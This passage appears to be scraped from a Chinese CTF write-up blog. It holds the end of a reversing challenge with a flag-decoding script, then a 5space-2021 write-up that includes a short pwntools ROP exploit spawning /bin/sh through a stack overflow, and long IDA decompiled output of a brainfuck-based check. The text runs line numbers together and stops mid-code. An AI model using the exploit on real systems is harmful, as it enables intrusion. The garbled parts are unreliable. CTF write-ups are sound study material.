0x7C91, 0x5804, 0x83E5, 0xE78D, 0xF4EA, 0x0874, 0xED6B, 0x4B35, 0xE839, 0x57B4, 0xE77C, 0xEA68, 0x2525, 0xAD41, 0xED6F, 0x3A4A, 0x4BCC, 0x6015, 0xF440, 0x0858, 0x3AA6, 0x7809, 0x671D, 0x0874, 0xEA77, 0x63AF, 0x2E91, 0x5845, 0xF6C4, 0x086D, 0x7795, 0x3939, 0x57B4, 0x7C89, 0x82DC, 0x32ED, 0xB994, 0xC7AF, 0x9135, 0x0E65, 0x1B66, 0xED5B, 0x3235, 0x6577, 0x5A80, 0x3AD3, 0xE776, 0x1EE5, 0xAD41, 0xED59, 0x864C, 0x70B4, 0x3876, 0xED67, 0x64D6, 0xF8E5, 0xF505, 0xEAD9, 0x7C9C, 0x32ED, 0xB994, 0xB4EF, 0x0C6C, 0xF665, 0xF5F5, 0x9047, 0x521A, 0xE99E, 0xEA68, 0x252F, 0x9D09, 0x76B7, 0xE776, 0x1ED0, 0x095D, 0x0D4D, 0x5D5A, 0x087B, 0x2005, 0x1526, 0x7E76, 0x85AD, 0x78B9, 0xE8B6, 0x782C, 0x251C, 0x32ED, 0x7F68, 0xEBE3, 0xEA41, 0x57FD, 0xED59, 0x846D, 0x7A05, 0xB994, 0xBB78, 0xED6A, 0x08A6, 0x38DD, 0x3B5D, 0x7E45, 0xE839, 0x738C, 0xE9CC, 0x0A2D, 0x764A, 0x609E, 0xE8B6, 0xEA68, 0x2524, 0xE6BB, 0x7C9C, 0x639F, 0x3A95, 0x0895, 0xF40F, 0x8328, 0xEA69, 0x7EE5, 0xF8BD, 0x7F7D, 0x0D6D, 0x70B6, 0x458C, 0xE8B6, 0xEA68, 0x251C, 0x6065, 0xB35F, 0xC789, 0x5845, 0x7F7D, 0x6D89, 0x4C6E, 0xA20E, 0x60B5, 0x7E45, 0xED59, 0xF707, 0x69EF, 0x922A, 0x4BC5, 0xF6EF, 0x8635, 0xF4B9, 0x57B4, 0x7CF8, 0xED60, 0x2510, 0x095D, 0x20AF, 0x3545, 0xF40F, 0x8328, 0xEA41, 0x58A4, 0x225D, 0x7E7C, 0x4BDB, 0xF8BD, 0x082C, 0xEAE7, 0x5D57, 0x5D50, 0x0914, 0xE7C7, 0x8624, 0x7CF8, 0xED60, 0x2511, 0x7C8E, 0x7159, 0x8416, 0x7EF9, 0xE7E5, 0x774A, 0x3895, 0x1EC9, 0x7C90, 0x09B9, 0x58BD, 0x5FF5, 0xE99E, 0xEA68, 0x250A, 0x224C, 0xEA3D, 0x73F5, 0x7C89, 0x53A6, 0x3190, 0x3B5D, 0x1526, 0x7DD5, 0x666A, 0x0919, 0x225F, 0xCDEF, 0x79E1, 0x7E7B, 0x7E6B, 0x082C, 0xA277, 0xE885, 0xE8BB, 0xE775, 0x5FF7, 0xEA68, 0x251B, 0x7FDF, 0x589D, 0x7A05, 0x779A, 0x8A5A, 0x7C91, 0x5D5C, 0x32ED, 0xF628, 0x2195, 0xF49A, 0x0C77, 0xEAE1, 0x59B9, 0x58BD, 0xE570, 0xE99E, 0xEA3D, 0x73F9, 0x13AD, 0x2BF5, 0x225D, 0x7F7D, 0x70B6, 0x4A9C, 0x337A, 0x1EC9, 0x4D05, 0x7E75, 0x2578, 0xED59, 0x38E5, 0x1ECA, 0xA210, 0x3B5D, 0x779A, 0x8A6F, 0xC790, 0x2518, 0x4B41, 0x7C89, 0x5D49, 0x4D05, 0x152D, 0x73C5, 0x79F9, 0x4BED, 0x913C, 0x37C9, 0x5D4D, 0x53C8, 0x0941, 0x7C97, 0x5D5B, 0x346A, 0x82D8, 0x5F36, 0x801F, 0xC800]ctable = [ 0x00, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x20, 0x0A, 0x00, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x28, 0x21, 0x40, 0x23, 0x2C, 0x2E, 0x3F, 0x2F, 0x2A, 0x29, 0x3C, 0x3E, 0x00]t1 = []t2 = []for i in target: c = i % 40 b = ((i - c) % 1600) // 40 a = i // 1600 t1 += [a, b, c]i = 0while i &lt; len(t1): if t1[i] == 39: t2 += [t1[i] + t1[i + 1]] i += 2 else: t2 += [t1[i]] i += 1flag = ''for i in t2: if ctable[i] != 0x00: flag += chr(ctable[i])print(flag) 输出的内容为 1Milos Raonic (born 1990) is a Canadian professional tennis player. He reached a career high world No. 4 singles ranking in May 2015, as ranked by the Association of Tennis Professionals (ATP). His career highlights include a Grand Slam final at the 2016 Wimbledon Championships and two Grand Slam semifinals at the 2014 Wimbledon Championships and 2016 Australian Open. He was the 2011 ATP Newcomer of the Year, and has been ranked continuously inside the top 20 since August 2012. Raonic is the first player born in the 1990s to win an ATP title, to be ranked in the top 10, and to qualify for the ATP World Tour Finals. He has eight ATP singles titles, all won on hard courts. He is frequently described as having one of the best serves among his contemporaries. Statistically, he is among the strongest servers in the Open Era, winning 91p of service games to rank third all time. Aided by his serve, he plays an all court style with an emphasis on short points. 找到原题发现是求md5，然后发现求md5还求出来好几个…… 正确的那一个 12-&gt; python3 common.py | md5sum2c8cd31daeba8753815851f13e6370b3 - 这种时候应该找出题人py一个flag","link":"/2020/03/25/tar-tar-binks-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"title":"wp-5space-2021","text":"第五空间2021，忙完之后终于有时间梳理一下之前做题的思路和复现一下当时没有解出来的题目。 pwnbountyhunter基础栈溢出 1234567ssize_t vulnerable_function(){ char buf[144]; // [rsp+0h] [rbp-90h] BYREF system(\"echo Who are you? What do you want?\"); return read(0, buf, 0x200uLL);} 存在溢出，程序中包含/bin/sh字符串，rop 123456789101112131415161718192021from pwn import *p = process('./pwn')# p = remote('139.9.123.168', 32548)binary = ELF('./pwn')# def debug():# log.info(\"pid: %d\" % util.proc.pidof(p)[0])# pause()# debug()bin_sh = 0x403408system = binary.plt.systemlog.info(hex(system))ret = 0x401016pop_rdi = 0x40120bpayload = b'a'*(0x90+8)+p64(ret) + p64(pop_rdi)+p64(bin_sh)+p64(system)p.sendline(payload)p.interactive() reStrangeLanguage拿到的程序为pyinstaller打包，首先解包 解包使用pyinstxtractor解包，其中包含许多编译好的库文件和部分没有后缀的文件，这些没有后缀的文件实际上时pyc文件，可以反编译得到python代码，但是需要解决一个问题，解包时没法确定python版本，这些pyc文件是没有文件头的，因此第一步是需要补上对应python版本的文件头。 比较简单的方法是找到base_library.zip这个压缩文件，一般解包出来都会有，里面包含许多pyc文件，从这里复制文件头可以匹配python版本，然后可以用uncompyle6反编译。 123456789# uncompyle6 version 3.7.4# Python bytecode 3.8 (3413)# Decompiled from: Python 3.8.10 (default, Jun 2 2021, 10:49:15) # [GCC 9.4.0]# Embedded file name: main.py# Compiled at: 2083-07-26 15:12:22# Size of source mod 2**32: 1703593186 bytesimport brainfuckbrainfuck.main_check() python文件里并没有太多内容，调用了brainfuck库，主要的内容都在编译好的brainfuck.cp38-win_amd64.pyd中实现。 反编译pyd文件使用ida反编译，可以发现是一个brainfuck的解释器，读取一段指令然后执行，指令很多就不放了，方法是将指令转换为C语言，对应的关系为 12345678dic = {'&gt;': '++ptr;', '&lt;': '--ptr;', '+': '++*ptr;', '-': '--*ptr;', '.': 'putchar(*ptr);', ',': '*ptr = getchar();', '[': 'while (*ptr) {', ']': '}'} 转换为C语言之后的代码大体为 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;int main(){ char *ptr = (char *)malloc(1000); ++ptr; ++ptr; ++ptr; ...... --ptr; putchar(*ptr); ++*ptr; putchar(*ptr); --*ptr; putchar(*ptr); ++*ptr; putchar(*ptr); --*ptr; putchar(*ptr); ++*ptr; putchar(*ptr); --ptr; --ptr; while (*ptr) { --*ptr; } } ...... --ptr; --ptr; --ptr; --ptr; --ptr; --ptr; --ptr; --ptr;} 指令太多不好分析，此时借助编译器的优化，合并和去除无用的指令，然后进行反编译更容易梳理代码的逻辑，直接使用-O3标志进行最大程度的优化。 此时反编译出来的结果更易读，可调试，容易分析出代码的执行逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034103510361037103810391040104110421043104410451046104710481049105010511052105310541055105610571058105910601061106210631064106510661067106810691070107110721073107410751076107710781079108010811082108310841085108610871088108910901091109210931094109510961097109810991100110111021103110411051106110711081109111011111112111311141115111611171118111911201121112211231124112511261127112811291130113111321133113411351136113711381139114011411142114311441145114611471148114911501151115211531154115511561157115811591160116111621163116411651166116711681169117011711172117311741175117611771178117911801181118211831184118511861187118811891190119111921193119411951196119711981199120012011202120312041205120612071208120912101211121212131214121512161217121812191220122112221223122412251226122712281229123012311232123312341235123612371238123912401241124212431244124512461247124812491250125112521253125412551256125712581259126012611262126312641265126612671268126912701271127212731274127512761277127812791280128112821283128412851286128712881289129012911292129312941295129612971298129913001301130213031304130513061307130813091310131113121313131413151316131713181319132013211322132313241325132613271328132913301331133213331334133513361337133813391340134113421343134413451346134713481349135013511352135313541355135613571358135913601361136213631364136513661367136813691370137113721373137413751376137713781379138013811382138313841385138613871388138913901391139213931394139513961397139813991400140114021403140414051406140714081409141014111412141314141415141614171418141914201421142214231424142514261427142814291430143114321433143414351436143714381439144014411442144314441445144614471448144914501451145214531454145514561457145814591460146114621463146414651466146714681469147014711472147314741475147614771478147914801481148214831484148514861487148814891490149114921493149414951496149714981499150015011502150315041505150615071508150915101511151215131514151515161517151815191520152115221523152415251526152715281529153015311532153315341535153615371538153915401541154215431544154515461547154815491550155115521553155415551556155715581559156015611562156315641565156615671568156915701571157215731574157515761577157815791580158115821583158415851586158715881589159015911592159315941595159615971598159916001601160216031604160516061607160816091610161116121613161416151616161716181619162016211622162316241625162616271628162916301631163216331634163516361637163816391640164116421643164416451646164716481649165016511652165316541655165616571658165916601661166216631664166516661667166816691670167116721673167416751676167716781679168016811682168316841685168616871688168916901691169216931694169516961697169816991700170117021703170417051706170717081709171017111712171317141715171617171718171917201721172217231724172517261727172817291730173117321733173417351736173717381739174017411742174317441745174617471748174917501751175217531754175517561757int __cdecl main(int argc, const char **argv, const char **envp){ ...... base = (char *)malloc(0x3E8uLL); if ( base[1] ) base[1] = 0; v4 = base[47] == 0; base[41] = 1; base[43] = 0; if ( !v4 ) base[47] = 0; base[46] = 0; *((_WORD *)base + 22) = 1; v4 = base[45] == 0; base[44] = 0; if ( !v4 ) base[45] = 0; v5 = base[41]; if ( v5 ) { base[44] += v5; base[45] += v5; base[41] = 0; } v6 = base[45]; if ( v6 ) { base[41] += v6; base[45] = 0; } if ( base[44] ) { ++base[43]; base[44] = 0; } v7 = base + 43; if ( !base[43] ) { v110 = base[47]; v111 = base[46]; if ( base[44] ) base[44] = 0; if ( v111 ) base[46] = 0; if ( v110 ) base[47] = 0; goto LABEL_62; } v8 = base[47]; v9 = base + 44; v10 = base[46]; if ( base[44] ) base[44] = 0; while ( 2 ) { v11 = getc(stdin); v7[1] = v11; *v7 = 0; if ( !v11 ) { v12 = v7 + 2; v13 = 0;LABEL_18: v14 = *(v7 - 42); *(_WORD *)(v7 + 1) = 0; if ( v14 ) goto LABEL_19; goto LABEL_231; } *v7 = v11; v12 = v7 + 2; v7[2] = v11; v7[1] = 0; v13 = v11; v7[2] = 10 - v11; if ( v11 != 10 ) goto LABEL_18; if ( v10 ) v7[3] = 0; if ( v8 ) v7[4] = 0; if ( *(v7 - 2) ) *(v7 - 2) = 0; v14 = *(v7 - 42); v10 = v7[3]; v7[1] = 0; v8 = v7[4]; if ( v14 ) {LABEL_19: v15 = v14 + 1; *(v7 - 42) = 0; v7[1] = v14; v7[2] = v14 + 1; if ( v14 == -1 ) goto LABEL_21; goto LABEL_20; }LABEL_231: v15 = 1;LABEL_20: *(v7 - 42) = v15; v7[2] = 0;LABEL_21: if ( v10 ) v7[3] = 0; if ( !v8 ) { if ( !v13 ) goto LABEL_26; goto LABEL_25; } v7[4] = 0; if ( v13 ) {LABEL_25: v7[3] = v13; *v7 = v13; v7[4] = 0; }LABEL_26: if ( v14 ) { while ( 1 ) { if ( v13 ) { v9[2] = 0; v9[3] = v13; } v19 = v9[1]; v14 = v19 + 1; v9[1] = v19 + 1; if ( v19 != -1 ) { v9[1] = 0; v9[2] = v14; } v20 = *v9; v21 = *v9 - 1; *v9 = v21; if ( v20 == 1 ) break; v16 = v21 - v20; v17 = v20 - 1; v18 = v9[4]; v9[1] = v17; *v9 = v16 + 1; v109 = v9 + 2; if ( !v17 ) goto LABEL_38; if ( v18 ) v12[3] = 0; v9 = v12; v12 = v109; } v18 = v9[4]; v109 = v9 + 2;LABEL_38: if ( v18 ) v12[3] = 0; } else { v109 = v12; v12 = v9; } if ( *(v12 - 42) ) *(v12 - 42) = 0; if ( v13 ) { *(v12 - 42) = v13; *v12 = v13; *((_WORD *)v12 + 1) = 0; } if ( !v14 ) goto LABEL_48; while ( v13 ) { v22 = *v109; v13 += *(v109 - 2); *(v109 - 1) = 0; *(v109 - 2) = v13; v23 = v22 - 1; *v109 = v22 - 1; if ( v22 == 1 ) goto LABEL_284;LABEL_47: *--v109 = v22 - 1; v109[1] = v23 - v22 + 1; } v22 = *v109; v13 = *(v109 - 2); v23 = *v109 - 1; *v109 = v23; if ( v22 != 1 ) goto LABEL_47;LABEL_284: --v109;LABEL_48: if ( *(v109 - 2) ) *(v109 - 2) = 0; if ( v13 ) *(v109 - 1) = 0; v24 = *(v109 - 44); if ( v24 ) *(v109 - 1) = v24; v4 = v109[2] == 0; *(_WORD *)v109 = 38; if ( !v4 ) v109[2] = 0; v25 = 38; while ( v24 ) { *(v109 - 1) = 0; v109[2] = v24; *(v109 - 1) = v24--; v109[2] = 0; *(v109 - 1) = v24; if ( !--v25 ) { *(_WORD *)v109 = 0; if ( v24 ) *(v109 - 1) = 0; goto LABEL_61; } } do --v25; while ( v25 ); v4 = *(v109 - 4) == 0; *(_WORD *)v109 = 256; *(v109 - 1) = 0; v109[1] = 0; if ( !v4 ) { *v109 = 0; v7 = v109 - 2; v10 = 0; *(v109 - 2) = 1; v9 = v109 - 1; v8 = 0; continue; } break; }LABEL_61: v7 = v109 - 2;LABEL_62: if ( v7[5] ) v7[5] = 0; if ( v7[6] ) v7[6] = 0; if ( v7[7] ) v7[7] = 0; if ( v7[8] ) { v26 = *(v7 - 41); v7[8] = 0; if ( v26 ) goto LABEL_70;LABEL_303: v27 = v7 + 6; if ( v7[7] ) { v28 = v7 + 5; *v27 = 'f'; } else { *((_WORD *)v7 + 3) = 102; v28 = v7 + 5; } goto LABEL_71; } v26 = *(v7 - 41); if ( !v26 ) goto LABEL_303;LABEL_70: *(v7 - 41) = v26; v27 = v7 + 6; *(_WORD *)(v7 + 7) = 0; v28 = v7 + 5; *v28 = v26; *(_WORD *)(v28 + 1) = 'f'; *((_BYTE *)v27 - 1) = 0; *(_BYTE *)v27 = 102 - v26; if ( v26 != 102 ) {LABEL_71: *((_BYTE *)v27 - 1) = 0; *(_BYTE *)v27 = 0; goto LABEL_72; } *((_BYTE *)v27 - 1) = 1; v4 = v28[1] == 0; *v28 = 1; if ( !v4 ) v28[1] = 0; v101 = 0; while ( 2 ) { v28[2] = 1; v102 = v28++; if ( v101 ) { v103 = *(v28 - 1); ++v101; *v28 = 0; v28[1] = v101; v104 = v103 - 1; *(v28 - 1) = v103 - 1; if ( v103 == 1 ) break; goto LABEL_235; } v103 = *(v28 - 1); v101 = 1; v104 = v103 - 1; *(v28 - 1) = v103 - 1; if ( v103 != 1 ) {LABEL_235: *v28 = v103 - 1; *(v28 - 1) = v104 - v103 + 1; continue; } break; } if ( v102[3] ) v102[3] = 0; if ( v102[4] ) { v105 = *(v102 - 45); v102[4] = 0; if ( v105 ) goto LABEL_242;LABEL_286: v105 = 0; } else { v105 = *(v102 - 45); if ( !v105 ) goto LABEL_286;LABEL_242: *(v102 - 45) = v105; v102[1] = v105; *(_WORD *)(v102 + 3) = 0; } v27 = v102 + 2; if ( v101 ) { while ( 1 ) { if ( v105 ) { v106 = *(_BYTE *)v27; v105 += *((_BYTE *)v27 - 2); *((_BYTE *)v27 - 1) = 0; *((_BYTE *)v27 - 2) = v105; v107 = v106 - 1; *(_BYTE *)v27 = v106 - 1; if ( v106 == 1 ) goto LABEL_282; } else { v106 = *(_BYTE *)v27; v105 = *((_BYTE *)v27 - 2); v107 = *(_BYTE *)v27 - 1; *(_BYTE *)v27 = v107; if ( v106 == 1 ) {LABEL_282: v28 = v27 - 1; v27 = (_WORD *)((char *)v27 - 1); break; } } *((_BYTE *)v27 - 1) = v106 - 1; *(_BYTE *)v27 = v107 - v106 + 1; v27 = (_WORD *)((char *)v27 - 1); } } *v27 = 'l'; if ( !v105 ) goto LABEL_71; *(_BYTE *)v27 = 108 - v105; if ( v105 != 108 ) goto LABEL_71; ++*((_BYTE *)v27 - 2); *((_BYTE *)v27 - 1) = 0;LABEL_72: v29 = v28 - 1; if ( !*(v28 - 1) ) goto LABEL_94; v4 = *v28 == 0; *(v28 - 1) = 2; if ( !v4 ) *v28 = 0; v30 = 0; while ( 2 ) { v29[2] = 1; v31 = v29++; if ( v30 ) { v32 = *(v29 - 1); ++v30; *v29 = 0; v29[1] = v30; v33 = v32 - 1; *(v29 - 1) = v32 - 1; if ( v32 == 1 ) break; goto LABEL_76; } v32 = *(v29 - 1); v30 = 1; v33 = v32 - 1; *(v29 - 1) = v32 - 1; if ( v32 != 1 ) {LABEL_76: *v29 = v32 - 1; *(v29 - 1) = v33 - v32 + 1; continue; } break; } if ( v31[3] ) v31[3] = 0; if ( v31[4] ) { v34 = *(v31 - 44); v31[4] = 0; if ( v34 ) goto LABEL_83;LABEL_295: v34 = 0; } else { v34 = *(v31 - 44); if ( !v34 ) goto LABEL_295;LABEL_83: *(v31 - 44) = v34; v31[1] = v34; *(_WORD *)(v31 + 3) = 0; } v35 = v31 + 2; if ( !v30 ) goto LABEL_91; while ( 2 ) { if ( v34 ) { v36 = *v35; v34 += *(v35 - 2); *(v35 - 1) = 0; *(v35 - 2) = v34; v37 = v36 - 1; *v35 = v36 - 1; if ( v36 == 1 ) break; goto LABEL_89; } v36 = *v35; v34 = *(v35 - 2); v37 = *v35 - 1; *v35 = v37; if ( v36 != 1 ) {LABEL_89: v38 = v37 - v36; v39 = v36 - 1; v40 = v35 - 1; *(v35 - 1) = v39; *v35 = v38 + 1; if ( !v39 ) goto LABEL_90; --v35; continue; } break; } v40 = v35 - 1;LABEL_90: v29 = v35 - 2; v35 = v40;LABEL_91: *(_WORD *)v35 = 97; if ( v34 &amp;&amp; (*v35 = 'a' - v34, v34 == 'a') ) { ++*(v35 - 2); *(v35 - 1) = 0; } else { *(v35 - 1) = 0; *v35 = 0; }LABEL_94: v41 = v29 - 1; if ( !*(v29 - 1) ) goto LABEL_113; v4 = *v29 == 0; *(v29 - 1) = 3; if ( !v4 ) *v29 = 0; v42 = 0; while ( 2 ) { v41[2] = 1; v43 = v41++; if ( v42 ) { v44 = *(v41 - 1); ++v42; *v41 = 0; v41[1] = v42; v45 = v44 - 1; *(v41 - 1) = v44 - 1; if ( v44 == 1 ) break; goto LABEL_98; } v44 = *(v41 - 1); v42 = 1; v45 = v44 - 1; *(v41 - 1) = v44 - 1; if ( v44 != 1 ) {LABEL_98: *v41 = v44 - 1; *(v41 - 1) = v45 - v44 + 1; continue; } break; } if ( v43[3] ) v43[3] = 0; if ( v43[4] ) { v46 = *(v43 - 43); v43[4] = 0; if ( v46 ) goto LABEL_105;LABEL_293: v46 = 0; } else { v46 = *(v43 - 43); if ( !v46 ) goto LABEL_293;LABEL_105: *(v43 - 43) = v46; v43[1] = v46; *(_WORD *)(v43 + 3) = 0; } v47 = v43 + 2; if ( !v42 ) goto LABEL_110; while ( 2 ) { if ( v46 ) { v48 = *v47; v46 += *(v47 - 2); *(v47 - 1) = 0; *(v47 - 2) = v46; v49 = v48 - 1; *v47 = v48 - 1; if ( v48 == 1 ) break; goto LABEL_109; } v48 = *v47; v46 = *(v47 - 2); v49 = *v47 - 1; *v47 = v49; if ( v48 != 1 ) {LABEL_109: *(v47 - 1) = v48 - 1; *v47-- = v49 - v48 + 1; continue; } break; } v41 = v47 - 2; --v47;LABEL_110: *(_WORD *)v47 = 103; if ( v46 &amp;&amp; (*v47 = 'g' - v46, v46 == 'g') ) { ++*(v47 - 2); *(v47 - 1) = 0; } else { *(v47 - 1) = 0; *v47 = 0; }LABEL_113: v50 = v41 - 1; if ( !*(v41 - 1) ) goto LABEL_133; *(v41 - 1) = 4; v51 = 0; while ( 2 ) { v50[2] = 1; v52 = v50++; if ( v51 ) { v53 = *(v50 - 1); ++v51; *v50 = 0; v50[1] = v51; v54 = v53 - 1; *(v50 - 1) = v53 - 1; if ( v53 == 1 ) break; goto LABEL_115; } v53 = *(v50 - 1); v51 = 1; v54 = v53 - 1; *(v50 - 1) = v53 - 1; if ( v53 != 1 ) {LABEL_115: *v50 = v53 - 1; *(v50 - 1) = v54 - v53 + 1; continue; } break; } if ( v52[3] ) v52[3] = 0; if ( v52[4] ) { v55 = *(v52 - 42); v52[4] = 0; if ( v55 ) goto LABEL_122;LABEL_291: v55 = 0; } else { v55 = *(v52 - 42); if ( !v55 ) goto LABEL_291;LABEL_122: *(v52 - 42) = v55; v52[1] = v55; *(_WORD *)(v52 + 3) = 0; } v56 = v52 + 2; if ( !v51 ) goto LABEL_130; while ( 2 ) { if ( v55 ) { v57 = *v56; v55 += *(v56 - 2); *(v56 - 1) = 0; *(v56 - 2) = v55; v58 = v57 - 1; *v56 = v57 - 1; if ( v57 == 1 ) break; goto LABEL_128; } v57 = *v56; v55 = *(v56 - 2); v58 = *v56 - 1; *v56 = v58; if ( v57 != 1 ) {LABEL_128: v59 = v58 - v57; v60 = v57 - 1; v61 = v56 - 1; *(v56 - 1) = v60; *v56 = v59 + 1; if ( !v60 ) goto LABEL_129; --v56; continue; } break; } v61 = v56 - 1;LABEL_129: v50 = v56 - 2; v56 = v61;LABEL_130: *(_WORD *)v56 = 123; if ( v55 &amp;&amp; (*v56 = '{' - v55, v55 == '{') ) { ++*(v56 - 2); *(v56 - 1) = 0; } else { *(v56 - 1) = 0; *v56 = 0; }LABEL_133: v62 = v50 - 1; if ( !*(v50 - 1) ) goto LABEL_150; *v50 = 0; v63 = 0; *(v50 - 1) = 37; while ( 2 ) { v62[2] = 1; v64 = v62++; if ( v63 ) { v65 = *(v62 - 1); ++v63; *v62 = 0; v62[1] = v63; v66 = v65 - 1; *(v62 - 1) = v65 - 1; if ( v65 == 1 ) break; goto LABEL_135; } v65 = *(v62 - 1); v63 = 1; v66 = v65 - 1; *(v62 - 1) = v65 - 1; if ( v65 != 1 ) {LABEL_135: *v62 = v65 - 1; *(v62 - 1) = v66 - v65 + 1; continue; } break; } if ( v64[3] ) v62[2] = 0; if ( v62[3] ) { v67 = *(v62 - 42); v62[3] = 0; if ( v67 ) goto LABEL_142;LABEL_289: v67 = 0; } else { v67 = *(v62 - 42); if ( !v67 ) goto LABEL_289;LABEL_142: *(v62 - 42) = v67; *v62 = v67; *((_WORD *)v62 + 1) = 0; } v68 = v62 + 1; if ( !v63 ) goto LABEL_147; while ( 2 ) { if ( v67 ) { v69 = *v68; v67 += *(v68 - 2); *(v68 - 1) = 0; *(v68 - 2) = v67; v70 = v69 - 1; *v68 = v69 - 1; if ( v69 == 1 ) break; goto LABEL_146; } v69 = *v68; v67 = *(v68 - 2); v70 = *v68 - 1; *v68 = v70; if ( v69 != 1 ) {LABEL_146: *--v68 = v69 - 1; v68[1] = v70 - v69 + 1; continue; } break; } --v68;LABEL_147: v62 = v68 - 1; *(_WORD *)v68 = 125; if ( v67 &amp;&amp; (*v68 = '}' - v67, v67 == '}') ) { ++*(v68 - 2); *(v68 - 1) = 0; } else { *(v68 - 1) = 0; *v68 = 0; }LABEL_150: if ( *(v62 - 2) ) *(v62 - 2) = 0; v71 = *(v62 - 1); if ( v71 ) { *(v62 - 2) = v71; *(v62 - 1) = 0; } v4 = *(v62 - 3) == 0; *v62 = 1; if ( v4 || (v4 = *(v62 - 2) == 0, v62[2] = 0, *v62 = 0, v4) ) { putc('n', _bss_start); putc('o', _bss_start); putc('n', _bss_start); putc('o', _bss_start); putc('n', _bss_start); putc('o', _bss_start); return 0; } *(_WORD *)v62 = 1; while ( 2 ) { v4 = v62[9] == 0; *(v62 - 3) = 1; v72 = v62 + 33; *(_QWORD *)(v62 + 1) = 0x2035550545A0F53LL; if ( !v4 ) v62[9] = 0; v4 = v62[16] == 0; *(_DWORD *)(v62 + 10) = 0x7075607; *((_WORD *)v62 + 7) = 0x95B; if ( !v4 ) v62[16] = 0; v4 = v62[36] == 0; *(v62 - 4) = 5; *(_QWORD *)(v62 + 17) = 0x51505C5D03020550LL; *(_QWORD *)(v62 + 25) = 0x340757025F5A5452LL; *(_WORD *)(v62 + 33) = 0x2405; v62[35] = 0; if ( !v4 ) v62[36] = 0; v73 = 5; v74 = 36; while ( v73 ) { v62[33] = 0; v62[36] = v73; v62[33] = v73--; v62[36] = 0; v62[33] = v73; if ( !--v74 ) { *((_WORD *)v62 + 17) = 0; if ( v73 ) v62[33] = 0;LABEL_168: *(v72 - 37) = 0; goto LABEL_169; } } do --v74; while ( v74 ); *((_WORD *)v62 + 17) = 0x100; v62[33] = 1; v62[35] = 0; v112 = 5;LABEL_309: *v72 = 0; if ( !v112 ) { v116 = v72 + 2; goto LABEL_315; } *v72 = v112; v113 = v72 + 2; *v113 = v112; *(v113 - 39) = v112; v112 = 0; *(v113 - 1) = 0; v113[1] = 0; while ( 2 ) { v113[2] = 1; if ( v112 ) { v114 = *v113; ++v112; v113[1] = 0; v113[2] = v112; v115 = v114 - 1; *v113 = v114 - 1; if ( v114 == 1 ) { v116 = v113 + 1; goto LABEL_315; } goto LABEL_311; } v114 = *v113; v115 = *v113 - 1; *v113 = v115; if ( v114 != 1 ) { v112 = 1;LABEL_311: *++v113 = v114 - 1; *(v113 - 1) = v115 - v114 + 1; continue; } break; } v116 = v113 + 1; v112 = 1;LABEL_315: if ( v116[2] ) v116[2] = 0; if ( v116[3] ) { v117 = *(v116 - 77); v116[3] = 0; if ( v117 ) goto LABEL_319; } else { v117 = *(v116 - 77); if ( v117 ) {LABEL_319: *v116 += v117; *(v116 - 77) = v117; *((_WORD *)v116 + 1) = 0; } } v118 = v116 + 1; if ( v112 ) { while ( 1 ) { v119 = *(v118 - 1); if ( v119 ) { *(v118 - 2) += v119; *(v118 - 1) = 0; } v120 = (*v118)--; if ( v120 == 1 ) break; *--v118 = v120 - 1; v118[1] = 0; } --v118; } v122 = 0; if ( v118[1] ) { v121 = *(v118 - 40); v118[1] = 0; if ( !v121 ) goto LABEL_327;LABEL_326: *(v118 - 40) = v121; v122 = v121; goto LABEL_327; } v121 = *(v118 - 40); if ( v121 ) goto LABEL_326;LABEL_327: v123 = v122 + 1; *(_WORD *)v118 = (unsigned __int8)(v122 + 1); if ( v122 == -1 ) goto LABEL_333; v123 = 0; while ( 2 ) { v118[2] = 1; if ( v123 ) { v124 = *v118; ++v123; v118[1] = 0; v118[2] = v123; v125 = v124 - 1; *v118 = v124 - 1; if ( v124 == 1 ) { ++v118; goto LABEL_333; } goto LABEL_329; } v124 = *v118; v125 = *v118 - 1; *v118 = v125; if ( v124 != 1 ) { v123 = 1;LABEL_329: *++v118 = v124 - 1; 